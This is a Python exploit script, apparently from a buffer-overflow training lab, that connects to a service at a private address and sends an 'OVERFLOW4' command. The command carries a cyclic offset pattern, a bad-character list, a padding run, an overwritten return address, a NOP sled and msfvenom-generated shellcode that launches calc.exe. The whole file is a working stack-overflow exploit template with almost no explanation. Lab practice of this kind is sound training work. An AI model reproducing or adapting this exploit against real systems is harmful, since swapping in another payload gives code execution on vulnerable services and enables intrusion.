import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip = '10.10.107.7'
port = 1337

s.connect((ip,port))

msg = s.recv(2048).decode()
print(msg)
pattern = 'Lyxi23nstGIdbtRzG7tuZSiMANEydpHkezpNdR1tTDKTJQpbLqLr2azD1CnfxV8tAb7J4ga8t8oWzlgxmqdSbDZ2Y8Bgpqpb0zL8rwh5VUgbFjEYJBkB8VfdSFjZxdRZTlJgXVCCeEHwDivwx4afIObznbppe6WdkbYl0bQhbLuiI9d01qZTWSqSEXJTBTvEAV383modKedq56ClXQvc8JFgAzqV45oMDdiLHKSLHzfTCiIXEptzfx9spZFfE79pgzBl8pWDJzIHiXzZKS5JqFISJsXIw7cyG4bOnS4F2hPlK7zRoFt7pmFiBbT7EvQPgb0Kazq9anR2fyi7XOdXLfPGXX4PZOXYWDbXhnN0tNjb20Vbq4ivpNi1lh0A6e4CoE1BDgWwt3eq6U4kDSHUn8KFCQZzgs1IjGui3ldJweWVAO7WQd7bklZ2vWzbrjGJmxMQYCGkvm7stZBTYSMY89oXrYqrRV9hFPJLp866ZCd8IuuiceThJjqw6f8LElFcchgRkpPYMRwKkkyEWM8ic2niComWeLlaDFgHKDskJV9eYHIVelXKVdDBByFtY40WywjFnXKnZZfGFadFfAP0rBdZ9LlHzYTHTzG2rZEHGVu3D6XOgvU8Jw5i1vzXqEZkWCQymS9F32kuUitLADgk6jfJfHi3SPfsX758pzhNRAurLKxrboPo1wg0smxPne0MQTmZqCaUWHxfRTOeeduGFfuwAE2GM8IwOqZPkNy2hkF0DhRP0JNOnTUMb1qqDjBLOSY4fEK4VfYsZ2LSWL2cMUfq4QHwfeKG9mnHhSH0pkhtmmfqSDUEA7NRHaKz67en1Ftx90XfnGH245ikY27bKAxjQOPnXLUyneUvtgQsABp6hW0uhyxjihMBtGeDBWI8YCzTFBbvUr5pQY6PrKM34oG0GCJDYtqu2n3LtImbTuwWufVotNXqNAMX20cvzYVapcQcZs9bMKTs9bd615nLsHRTtKcbBvPLZ4UQAjORUJEjyiJD4e51xXheIVfyad9MWWYGwbNZDdb6H2OfJZvIjcKS5ApK9clMBmys9Wve7M4uNBjMOP7MhFFLQ31nvTAlR5vKn8VlH9nJYD7epwm3hP7ycV0ileBFyB2XWBxzBMMISfcgshEGqQOk9AFSFtJ0eo1P6Ggt0JbTh4nwQ6vHhvj5MSrjZJRym2ntFjGN8VjNiPqnPPI93wYSynYGygMy40nVjJD5HbuO7JaBeKqcAE41nUWPSARkH4QuuMwqM3zMbt9ii5RepESVfvdttuvfc2SrU8yFYa4H0wSoE1pKVWzmM4OQLqDjTKu5w3HchbvyaNFkczPZJngnV4MVfcgpuToUXxH31PwxQPufjG1qsjg2ogloRbDVZ4fy4JIRVJyv8KBHaCaCXci6v6zUjHtNBUfYMf39joExrzBt9anlFuhfGiTCrgHw2V8nR63wmu4afeJmDlZeW0ffV6UQIurdkx6PSBWFPpsWh5keXnama50Ibpvk'
allbytes = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# 0186FA30   7A656B48  Hkez	 esp 30
# \x00\xa9\xcd\xd4

junk = 'A'*2026
eip = '\xaf\x11\x50\x62'

esp = '\x90'*20

#  msfvenom -p windows/exec cmd=calc.exe -b "\x00\xa9\xcd\xd4" -f c
esp += ("\xd9\xc7\xb8\x77\x12\x80\xd2\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x31\x83\xed\xfc\x31\x45\x14\x03\x45\x63\xf0\x75\x2e\x63\x76"
"\x75\xcf\x73\x17\xff\x2a\x42\x17\x9b\x3f\xf4\xa7\xef\x12\xf8"
"\x4c\xbd\x86\x8b\x21\x6a\xa8\x3c\x8f\x4c\x87\xbd\xbc\xad\x86"
"\x3d\xbf\xe1\x68\x7c\x70\xf4\x69\xb9\x6d\xf5\x38\x12\xf9\xa8"
"\xac\x17\xb7\x70\x46\x6b\x59\xf1\xbb\x3b\x58\xd0\x6d\x30\x03"
"\xf2\x8c\x95\x3f\xbb\x96\xfa\x7a\x75\x2c\xc8\xf1\x84\xe4\x01"
"\xf9\x2b\xc9\xae\x08\x35\x0d\x08\xf3\x40\x67\x6b\x8e\x52\xbc"
"\x16\x54\xd6\x27\xb0\x1f\x40\x8c\x41\xf3\x17\x47\x4d\xb8\x5c"
"\x0f\x51\x3f\xb0\x3b\x6d\xb4\x37\xec\xe4\x8e\x13\x28\xad\x55"
"\x3d\x69\x0b\x3b\x42\x69\xf4\xe4\xe6\xe1\x18\xf0\x9a\xab\x76"
"\x07\x28\xd6\x34\x07\x32\xd9\x68\x60\x03\x52\xe7\xf7\x9c\xb1"
"\x4c\x07\xd7\x98\xe4\x80\xbe\x48\xb5\xcc\x40\xa7\xf9\xe8\xc2"
"\x42\x81\x0e\xda\x26\x84\x4b\x5c\xda\xf4\xc4\x09\xdc\xab\xe5"
"\x1b\xbf\x2a\x76\xc7\x6e\xc9\xfe\x62\x6f")

junk2 = 'D'*(3500-len(junk+eip+esp)) 

payload = 'OVERFLOW4 ' + junk  + eip + esp + junk2
payload = payload.encode('raw_unicode_escape')

s.send(payload)

s.close()
